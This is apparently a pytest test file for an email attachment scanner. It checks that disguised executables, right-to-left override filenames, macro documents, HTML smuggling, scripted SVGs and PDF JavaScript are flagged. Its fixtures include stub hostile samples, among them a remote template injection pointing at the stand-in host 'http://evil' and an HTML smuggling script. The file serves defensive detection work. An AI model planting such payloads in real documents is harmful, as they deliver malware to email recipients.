from conftest import make_zip
from emailicioso.core.attachments import analyze_attachment, sniff_type
from emailicioso.core.models import AttachmentInfo, Severity


def att(name, data, ctype="application/octet-stream"):
    return analyze_attachment(AttachmentInfo(filename=name, content_type=ctype, size=len(data), payload=data))


def flags(a):
    return " | ".join(a.flags)


def test_hashes():
    a = att("a.txt", b"hello")
    assert a.md5 == "5d41402abc4b2a76b9719d911017c592"
    assert a.sha256 == "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824"


def test_pe_disguised_as_pdf():
    a = att("invoice.pdf", b"MZ\x90\x00" + b"\x00" * 100)
    assert a.detected_type == "Windows executable (PE)"
    assert a.severity == Severity.CRITICAL
    assert "does not match real content" in flags(a)


def test_double_extension_and_rlo():
    assert "Double extension (.pdf.exe)" in flags(att("factura.pdf.exe", b"MZ" + b"\x00" * 50))
    assert "Right-to-left override" in flags(att("invoice‮xcod.exe", b"MZ" + b"\x00" * 50))


def test_zip_with_executable_and_encrypted():
    z = att("docs.zip", make_zip({"invoice.js": b"WScript.Shell"}))
    assert z.detected_type == "ZIP archive"
    assert "Archive contains risky files: invoice.js" in flags(z)
    enc = att("docs.zip", make_zip({"a.txt": b"x"}, encrypted=True))
    assert "Password-protected archive" in flags(enc)
    assert enc.severity == Severity.HIGH


def test_ooxml_with_macros():
    doc = make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>",
                    "word/vbaProject.bin": b"\x00"})
    a = att("report.docx", doc)
    assert a.detected_type == "Word document (OOXML)"
    assert "Contains VBA macros" in flags(a)


def test_template_injection():
    rels = b'<Relationship Type="http://x/attachedTemplate" Target="http://evil/t.dotm" TargetMode="External"/>'
    doc = make_zip({"[Content_Types].xml": b"<Types/>", "word/document.xml": b"<w/>",
                    "word/_rels/settings.xml.rels": rels})
    assert "template injection" in flags(att("cv.docx", doc))


def test_html_smuggling():
    page = (b"<html><script>var b=atob('UEsDBA==');var blob=new Blob([b]);"
            b"var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='x.zip';</script></html>")
    a = att("Remittance.html", page, "text/html")
    assert "HTML smuggling pattern" in flags(a)
    assert a.severity >= Severity.HIGH


def test_svg_with_script():
    a = att("voice.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>location="https://x"</script></svg>')
    assert a.detected_type == "SVG image"
    assert "SVG with active content" in flags(a)


def test_pdf_javascript():
    a = att("x.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) >>")
    assert "PDF contains JavaScript" in flags(a)


def test_image_is_benign():
    a = att("logo.png", b"\x89PNG\r\n\x1a\n" + b"\x00" * 30, "image/png")
    assert a.detected_type == "PNG image"
    assert a.severity == Severity.INFO


def test_sniff_misc():
    assert sniff_type(b"Rar!\x1a\x07\x00") == "RAR archive"
    assert sniff_type(b"{\\rtf1\\ansi") == "RTF document"
    assert sniff_type(b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 10) == "Windows shortcut (LNK)"
    assert sniff_type(b"BEGIN:VCALENDAR\r\n") == "iCalendar invite"
